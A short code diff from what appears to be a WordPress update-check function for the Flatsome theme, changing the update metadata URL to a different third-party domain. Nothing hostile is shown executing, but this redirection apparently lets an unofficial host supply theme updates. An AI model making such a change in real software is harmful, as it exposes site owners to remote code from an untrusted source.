@@ -8,9 +8,8 @@ function wupdates_check_YL6Wd( $transient )
 		if (empty($transient->checked)) {
 			return $transient;
 		}
-
 		$t = 'flatsome';
-		$r = 'https://update.shopwp.net/wp-update?action=get_metadata&slug=' . $t;
+		$r = 'https://360group.vn/wp-update/get_metadata.php?action=get_metadata&slug=' . $t;
 		$e = wp_remote_get($r);
 		if (is_wp_error($e) || wp_remote_retrieve_response_code($e) != 200) {
 			return $transient;
